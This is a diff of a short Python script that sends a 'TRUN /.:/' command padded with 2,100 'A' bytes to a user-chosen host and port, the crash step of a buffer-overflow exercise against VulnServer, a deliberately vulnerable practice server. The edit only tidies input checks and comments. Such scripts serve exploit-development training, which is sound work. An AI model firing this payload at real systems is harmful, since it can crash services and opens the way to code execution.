@@ -1,31 +1,26 @@
-#!/usr/bin/python3 
+#!/usr/bin/python3
 
 import sys,socket
-import time
 
-print("*****VulnServer*****")
-ip_address=input("Enter the IP address:\n")
-port=input("Enter the port number:\n")
+#user input
+ip_address=input("Enter the IP address\n")
+port_number=input("Enter the port number\n")
 
-
-if (len(ip_address)==0) or (len(port)==0):
-    if (len(ip_address)>0) and (len(port)==0):
-        print("*"*40)
-        print("Port number field is empty")
-    elif (len(ip_address)==0) and (len(port)>0):
-        print("*"*40)
-        print("IP address field is empty")
-    elif (len(ip_address)==0) and (len(port)==0):
-        print("*"*40)
-        print("IP address field is empty")
-        print("Port number field is empty")
-    else:
-        print("*"*40)
-        print("Issues with the user input")
-
-elif (len(ip_address)>0) and (len(port)>0):
-    buffer=2100
+def lines():
+    print("*"*50)
+if len(ip_address)==0 or len(port_number)==0:
+    lines()
+    print("User input missing, kindly check")
+else:
+    #buffer size --> 2100
+    buffer_size=2100
+    #connect to ip and port number
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip_address,int(port)))
-    print(f"Sending buffer --> {buffer}")
-    s.send(b"TRUN /.:/ " + b"A" *buffer)
+    #print buffer size
+    print(f"Sending buffer -->{buffer_size}")
+    #connect to ip adn port number
+    s.connect((ip_address, int(port_number)))
+    #send buffer
+    s.send((b"TRUN /.:/ " + b"A" * buffer_size))
+    s.close()
+
